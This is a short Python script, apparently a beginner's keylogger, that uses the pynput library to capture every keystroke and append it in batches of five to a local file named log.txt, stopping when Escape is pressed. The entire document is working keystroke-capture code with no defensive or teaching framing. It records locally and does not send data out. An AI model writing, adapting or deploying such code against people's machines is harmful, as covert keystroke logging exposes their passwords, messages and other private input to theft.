import pynput
from pynput.keyboard import Key, Listener


count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)  # Add the Key object to the keys list
    count += 1

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []




def write_file(keys):
    try:
        with open('log.txt', 'a') as f:
            for key in keys:
                try:
                    f.write(str(key.char))
                except AttributeError:
                    f.write(str(key.name))
    except:
        with open('log.txt', 'w') as f:
            for key in keys:
                try:
                    f.write(str(key.char))
                except AttributeError:
                    f.write(str(key.name))


def on_release(key):
	if key == Key.esc:
		return False




with Listener(on_press=on_press , on_release=on_release) as listener:
	listener.join()
